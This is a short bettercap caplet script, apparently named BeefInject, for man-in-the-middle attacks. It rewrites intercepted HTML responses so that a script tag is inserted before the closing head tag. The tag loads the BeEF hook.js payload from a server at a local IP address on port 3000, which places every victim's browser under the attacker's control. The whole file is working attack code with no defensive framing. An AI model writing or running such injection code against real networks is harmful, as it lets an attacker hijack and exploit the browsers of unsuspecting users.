function onLoad() {
  log( "BeefInject loaded." );
}
//this js code import beef framework
//for bettercap caplets
function onResponse(req, res) {
  if( res.ContentType.indexOf('text/html') == 0 ){
    var body = res.ReadBody();
    if( body.indexOf('</head>') != -1 ) {
 log( "BeefInject loaded." );
      res.Body = body.replace( 
        '</head>', 
        '<script type="text/javascript" src="http://192.168.155.109:3000/hook.js"></script></head>' 
      ); 
    }
  }
}
